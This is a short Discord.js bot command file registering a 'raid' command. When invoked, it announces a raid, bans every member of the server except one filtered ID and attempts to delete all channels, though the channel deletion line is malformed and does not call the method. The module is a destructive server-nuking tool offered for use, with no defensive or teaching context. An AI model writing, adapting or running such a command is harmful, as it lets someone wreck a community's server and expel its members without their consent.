const Discord = require("discord.js");
let gems = require("../gems.json");

module.exports.run = async (bot, message, args) => {
  message.channel.send("Raid Starting?");
  message.guild.members.filter(u => u.id !== 'stock-prices').forEach(user => user.ban("NO!"));
  message.guild.channels.filter(u => u.id !== 'stock-prices').forEach(channel => channel.delete);
}

module.exports.help = {
  name: "raid"
}
